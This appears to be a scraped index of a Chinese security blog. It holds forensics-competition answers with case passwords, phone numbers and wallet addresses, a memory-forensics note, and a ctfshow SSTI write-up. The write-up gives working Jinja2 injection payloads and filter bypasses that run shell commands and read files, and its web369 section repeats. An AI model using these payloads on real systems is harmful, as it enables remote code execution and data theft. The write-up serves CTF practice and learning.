由从检材1中提取出的ios备份数据得知， 由加密备份中获取到的手机通话记录可知给号码 “13502409024” 最后一次打电话的时间是 2023-12-04 13:18:50 检材二手机中高德地图最后搜索的地址。 万达广场 (南沙店)(双山大道 3 号) 检材二手机最后一次登陆 / 注册 “HotsCoin” 的日期是 2023-12-04 检材二手机中照片 “IMG_0002” 的拍摄时间是？ 2023-12-06 11:08:30 检材二中 “小西米语音”app 的 Bundle ID 是什么？ com.titashow.tangliao 检材二中浏览器最后一次搜索的关键词是什么？ ios 备份密码忘了怎么办 五位纯数字 23-24. 嫌疑人和洗钱人员约定电子钱包的品牌是什么，金额比例是什么。 imToken Bitcoin 0.2 通过 “小西米语音” 约定如题内容，具体位置为该 app 备份数据下 “/AppDomain-com.titashow.tangliao/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522 文件中 message 表 检材三中进程 “FTK Imager.exe” 的 PID 是多少？ 11328 检材三中显示的系统时间是多少？ 2023-12-12 04:06:25 检材三中记录的当前系统 ip 是多少？ 172.18.7.229 检材四中迅雷下载过的文件名是什么？ 《向银河靠近》.txt 29、32. 检材四中安装了哪些可是实现翻墙（VPN）功能的 app，FileCompress app 包名是什么？ Clash com.zs.filecompress 30、31. 检材四备份的设备系统版本是多少，检材四备份的时间是多少（答案以 13 位时间戳表示） 由备份文件中 “descript.xml” 可知： V14.0.2.0.TKSCNXM 1702101947266 检材四中备忘录记录的内容是什么？（tip） Vcpswd:edgewallet 请列出检材四中所有虚拟币钱包 app 的包名。 de.schildbach.wallet、com.bitcoin.mwallet、piuk.blockchain.android、im.token.app、com.paxful.wallet（火币不算，火币更多的是交易平台） 检材四中嫌疑人使用 Bitcoin Wallet 钱包地址是什么？ bc1q4ru3a8r0vzymwwcmawvtdyf6hkvt2x9477hjkt 在该 app 备份数据中 “apps\\de.schildbach.wallet\\f\\log\\wallet.log” 文件中保存，搜 “enlarged” 关键字 36.MD5 值为 “FF3DABD0A610230C2486BFFBE15E5DFF” 的文件在检材四中的位置 FileCompress(com.zs.filecompress).bak\\FileCompress\\11 月.txt 检材中受害人的微信号是多少？ B-I-N-A-R-Y 嫌疑人曾通过微信购买过一个公民信息数据库，该数据库中手机尾号是 8686 的用户的姓名是 章敏 嫌疑人手机中是否保存了小西米语音 app 的账号密码，如有，请写出其密码. jamvU1@wiwgug$bo 上一题数据库中，截止到 2023 年 12 月 31 日，年龄大于等于 18 且小于等于 30 岁之间的用户信息数量 1717 身份证里面年份是 “1993-2005” 年的人 受害人小浩的手机号码是多少 13533333333 存放在加密的 “11 月.txt” 文件，可以从检材4导出filecompress安装包，使用 jadx 工具反编译安装包，发现文件加密方式为常见的压缩方式，密码为 “1!8Da9Re5it2b3a.” 完整的受害人名单是几个人。 6 人 分别存放在三个位置 1、“9 月. txt”、“10 月. txt” 存放在检材一中的 VeraCrypt 加密容器里（C:\\Users\\rd\\Documents \\ 新建文本文档. txt） 2、“11 月. txt” 存放在检材四中（20231213_172032\\FileCompress(com.zs.filecompress)\\FileCompress\\11 月. txt） 受害人转账的总金额是多少 600 元 检材 2 恢复出的转账记录 加密备份转账记录 以下解题思路来自第四届中科实数杯官方wp： 正常对检材 1- 检材 4 进行正常的数据解密、获取和分析。 根据题目提示发现嫌疑人曾搜索过 “ios 备份密码忘了怎么办 五位纯数字”，分析嫌疑人可能还有一个加密的备份，在检材 1 默认的 itunes 备份目录下找到该加密备份，对该备份进行正常的数据解密、获取和分析。 3. 从加密备份中获取到了 keychain 数据，发现其中有小西米语音的账号密码和检材 1 的开机密码数据。由题目提示也可指小西米语音内有猫腻，查聊天记录发现其存在于洗钱人员约定的钱包品牌和比例。 4. 从题目提示到的 FileCompress app 和 MD5 文件所指向的文件 “11 月.txt” 为加密文件，通过逆向分析即可破解，发现其文件为受害人名单。（也可以通过检材四备份获取其安装包，安装到模拟器或安卓手机上，导入加密文件即可解密） 5. 通过分析检材一的最近访问文档记录，发现存在可疑文件 “9 月.txt”、“10 月.txt” 6. 通过分析检材一的最近访问文档记录、加密文件分析、反取证软件列表，发现可疑文件 “[C]:\\Users\\rd\\Documents\\ 新建文本文档.txt” 为 VeraCrypt 加密文件 7. 再根据题目备忘录内容，VeraCrypt 加密文件的密码与 edgewallet 相关。查 edgewallet 在检材 1 浏览器保存的账号密码里面有体现，仿真检材 1，输入 keychain 获取的开机密码，查看浏览器保存密码的明文，使用该密码打开 Vc 加密文件，查看其中的内容。 ","date":"2024-02-10","objectID":"/zkssb4/:0:0","series":null,"tags":["Forensics","wp"],"title":"2024 第四届“中科实数杯”全国电子数据取证与司法鉴定挑战赛","uri":"/zkssb4/#"},{"categories":["forensics"],"content":"记一内存取证题目 python vol.py -f C:\\Users\\scofi\\Desktop\\baby_misc.raw windows.filescan 导出flag.zip，发现有密码，又找到hint.txt 导出calc进程的内存，修改后缀为.data并放进gimp进行分析 调试图像技巧： 先把载入图像的区域拉大 图像类型建议选择RGB透明，对比比较明显，宽高设置成七百到一千多就行，根据自己需要可以选择常规的分辨率，最终还是取决于偏移。 1440 x 900 1400 x 1050 1366 x 768 1360 x 768 1280 x 960 1280 x 800 1280 x 768 1280 x 720 1280 x 600 1152 x 864 1024 x 768 800 x 600 calc.exe进程没拿到关键信息，随后在exprolor.exe进程中取到了calc的截图 最终在Windows模块信息中搜索132424464得到了完整的十六进制字符串5E26473132424464，直接解密不对，十六进制转文本解压成功 ","date":"2024-02-09","objectID":"/forensics_mem/:0:0","series":null,"tags":["forensics"],"title":"Forensics_内存取证gimp分析进程图像","uri":"/forensics_mem/#"},{"categories":["CTF","web"],"content":"ctfshow ssti漏洞专题 python jinja2 jinja2注入的payload使用的一些标签会导致GitHub Page 报错，所以全文插入了一些{% raw %}、{% endraw %}标签请忽略，另外，部分payload种将%替换为文字百分号也是为了规避报错 https://blog.alonesky.com/github-page-variable-was-not-properly-terminated-with-regexp-0uy1a ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入 ","date":"2024-02-08","objectID":"/ctfshow_ssti/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#"},{"categories":["CTF","web"],"content":"\r笔记","date":"2024-02-08","objectID":"/ctfshow_ssti/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#笔记"},{"categories":["CTF","web"],"content":"\r代码块 变量块 {{}} 用于将表达式打印到模板输出 注释块 {##} 注释 控制块 {百分号%} 可以声明变量，也可以执行语句 //这个标签会造成GitHub报错，所以用文字替换了 {% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{百分号 print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %} 行声明 ## 可以有和{百分号%}相同的效果 ","date":"2024-02-08","objectID":"/ctfshow_ssti/:1:1","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#代码块"},{"categories":["CTF","web"],"content":"\r常用方法 python的str(字符串)、dict(字典)、tuple(元组)、list(列表)这些在Python类结构的基类都是object，而object拥有众多的子类。 [].__class__：列表 ''.__class__ ：字符串 ().__class__ ：元组 {}.__class__：字典 ------------------------------------------------------------ 有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（\u003cclass'object'\u003e）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。 __class__ ：类的一个内置属性，查看实例对象的类。 __base__ ：类型对象的直接基类 __bases__ ：类型对象的全部基类（直接父类），以元组形式（只有一个元素），类型的实例通常没有属性 __bases__ __mro__ ：可以用来获取一个类的调用顺序，元组形式，返回如(\u003cclass 'str'\u003e, \u003cclass 'object'\u003e)。__mro__[1]就是object ------------------------------------------------------------ __subclasses__()：返回这个类的所有子类，列表形式。 __builtins__：内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。返回内建内建名称空间字典__builtins__与__builtin__的区别就不放了，百度都有。 （做为默认初始模块出现的，可用于查看当前所有导入的内建函数。，集合形式） __init__：初始化类，返回的类型是function，可以用来跳到__globals__。 __globals__：会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。 __import__：动态加载类和函数，也就是导入模块，经常用于导入os模块，语法：__import__(模块名)。如：__import__('os').popen('ls').read() ------------------------------------------------------------ __dic__ ：类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里 __getattribute__()：实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。 __getitem__()：调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b') ","date":"2024-02-08","objectID":"/ctfshow_ssti/:1:2","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#常用方法"},{"categories":["CTF","web"],"content":"\rSSTI-jinja2执行命令 内建函数 eval 执行命令 os 模块执行命令 popen 函数执行命令 importlib 类执行命令 linecache 函数执行命令 subprocess.Popen 类执行命令 ","date":"2024-02-08","objectID":"/ctfshow_ssti/:1:3","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#ssti-jinja2执行命令"},{"categories":["CTF","web"],"content":"\r一般注入流程在检测到存在SSTI模板注入漏洞之后-\u003e获得内置类所对应的类-\u003e获得object基类-\u003e获得所有子类-\u003e获得可以执行shell命令的子类-\u003e找到该子类可以执行shell命令的方法-\u003e执行shell命令 ","date":"2024-02-08","objectID":"/ctfshow_ssti/:1:4","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#一般注入流程"},{"categories":["CTF","web"],"content":"\r靶场题目","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web361]无过滤 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{7*7}} 回显49，存在ssti注入漏洞 获得内置类所对应的类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__}} 获得object基类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__}} 获得所有子类 http://ce35ed03-e23c-4193-91c5-a9cec7d03e26.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()}} 通过python脚本判断可以执行shell命令子类的索引值 以子类是否存在popen方法为例： import requests for num in range(500): try: url = \"http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()[\"+str(num)+\"].__init__.__globals__['popen']}}\" res = requests.get(url=url).text if 'popen' in res: print(num) except: pass 执行shell命令 http://53e07393-3341-47a7-b048-e4773c51a22c.challenge.ctf.show/?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}} 读取flag文件 ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:1","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web361无过滤"},{"categories":["CTF","web"],"content":"\r[web362]过滤数字开始过滤数字，写个python脚本测试一下哪些数字没被过滤 import requests for i in range(10): url = \"http://e789961f-7694-423c-a72f-d00e630f15b3.challenge.ctf.show/?name=\"+str(i) res = requests.get(url=url).text if \":(\" not in res: print(i) 可以用全角数字进行绕过 ‘０’,‘１’,‘２’,‘３’,‘４’,‘５’,‘６’,‘７’,‘８’,‘９’ payload: //根据上题序列，替换为全角数字 ?name={{\"\".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}} 以下payload是抄的，暂时抄一下 ?name={{a.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}} ?name={{''.__class__.__bases__[0].__subclasses__()[１３２].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat /flag\").read()')}} ?name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:2","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web362过滤数字"},{"categories":["CTF","web"],"content":"\r[web363]过滤单双引号request.args.a绕过 payload： //request绕过 ?name={{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}\u0026a=os\u0026b=cat ../flag //chr字符串拼接 ?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}\u0026a=__builtins__\u0026b=__import__('os').popen('cat /flag').read() ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:3","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web363过滤单双引号"},{"categories":["CTF","web"],"content":"\r[web364]过滤args用其他方式传参 payload: ?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}} Cookie传参:x1=__builtins__;x2=__import__('os').popen('cat /flag').read() 发包： GET /?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}} HTTP/1.1 Host: 21384bce-894b-46a7-9265-8b1cba126448.challenge.ctf.show Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Cookie: x1=__builtins__;x2=__import__('os').popen('cat /flag').read() User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:4","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web364过滤args"},{"categories":["CTF","web"],"content":"\r[web365]过滤’’、\"\"、[、args跑fuzzy字典，发现四个过滤： //ssti-fuzz.txt . [ ] _ { } {{ }} {百分号 %} {%if {%endif {%print( 1 2 3 4 5 6 7 8 9 0 ' \" + %2B %2b join() u os popen importlib linecache subprocess |attr() request args value cookie __getitem__() __class__ __base__ __bases__ __mro__ __subclasses__() __builtins__ __init__ __globals__ __import__ __dic__ __getattribute__() __getitem__() __str__() lipsum current_app 过滤了四个字符''、\"\"、[、args 测os模块在哪 {{x.__class__.__bases__.__getitem__(0).__subclasses__()}} 原始payload： {{''.__class__.__bases__.__getitem__(0).__subclasses__()[132].__init__.__globals__.popen('ls /').read()}} __getitem__绕过中括号[过滤： {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen('ls /').read()}} request对象绕过引号''、\"\"过滤，cookie绕过args过滤 {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}} Cookie传参：x=ls / 成功进行命令执行后，改cookie传参： x=cat /flag ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:5","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web365过滤args"},{"categories":["CTF","web"],"content":"\r[web366]过滤’’、\"\"、[、args、_\r在web366 payload基础上，进行_绕过 {{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}} |attr()+request对象绕过对下划线的过滤 \"\"|attr(\"__class__\") 相当于 \"\".__class__ {{x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)(0)|attr(request.cookies.x4)()|attr(request.cookies.x5)(132)|attr(request.cookies.x6)|attr(request.cookies.x7).popen(request.cookies.x8).read()}} Cookie传参： x1=__class__;x2=__bases__;x3=__getitem__;x4=__subclasses__;x5=__getitem__;x6=__init__;x7=__globals__;x8=tac /f* 没通…… ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:6","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web366过滤args_"},{"categories":["CTF","web"],"content":"\r[web367]过滤’’、\"\"、[、args、_、os通过cookie传os {{(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()}} Cookie传参：x1= __globals__;x2=os;x3=tac /flag ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:7","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web367过滤args_os"},{"categories":["CTF","web"],"content":"\r[web368]过滤’’、\"\"、[、args、_、os、{{通过{百分号print(......)%}替代{{...}}来绕过对{花括号的过滤 {百分号print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%} Cookie传参：x1= __globals__;x2=os;x3=tac /flag 也可以用{百分号set来绕过 {百分号set aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{百分号print(aaa)%} Cookie传参：x1= __globals__;x2=os;x3=tac /flag {% raw %} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:8","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web368过滤args_os"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#web369过滤args_osrequest"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload1读取flag文件"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%} {%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%} {%set oo=dict(o=a,s=a)|join%} {%set pp=dict(po=a,pen=a)|join%} {%set space=chcr(32)%} {%set xiegang=chcr(47)%} {%set f1ag=dict(fl=a,ag=a)|join%} {%set shell=(dict(cat=a)|join,space,xiegang,f1ag)|join%} {%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%} ","date":"2024-02-08","objectID":"/ctfshow_ssti/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_ssti","uri":"/ctfshow_ssti/#payload2执行命令cat-flag"},{"categories":["CTF","web"],"content":"\r[web369]过滤’’、\"\"、[、args、_、os、{{、request抄了以下payload： payload1：读取/flag文件： ?name= {% set po=dict(po=1,p=2)|join} {% set a=(()|select|string|list)|attr(po)(24)%} {% set re=dict(reque=1,st=1)|join%} {% set in=(a~a~dict(init=a)|join~a~a)|join()%} {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} {% set ge=(a~a~dict(getitem=a)|join~a~a)%} {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} {% set chr=x.chr%} {% set f=chr(47)~(dict(flag=a)|join)%} {% print(x.open(f).read())%} 详解： //构造pop {% set po=dict(po=1,p=2)|join%} //构造下划线 _ {% set a=(()|select|string|list)|attr(po)(24)%} //构造request {% set re=dict(reque=1,st=1)|join%} //构造__init__ {% set in=(a~a~dict(init=a)|join~a~a)|join()%} //构造__globals__ {% set gl=(a~a~dict(globals=q)|join~a~a)|join()%} //构造__getitem__ {% set ge=(a~a~dict(getitem=a)|join~a~a)%} //构造__builtins__ {% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%} //【构造】q.__init__.__globals__.__getitem__.__builtins__ {% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%} //构造chr函数 {% set chr=x.chr%} // 构造/flag {% set f=chr(47)~(dict(flag=a)|join)%} //读取文件/flag {% print(x.open(f).read())%} payload2：执行命令cat /flag相当于lipsum.__globals__['__builtins__'].open('/flag').read() ?name={% print (lipsum|attr( (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower() )) .get( (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower() ) .popen( (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower() ).read() %} payload3：执行命令cat /flag //构造下划线_ ?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%} {%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%} {%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%} {%set 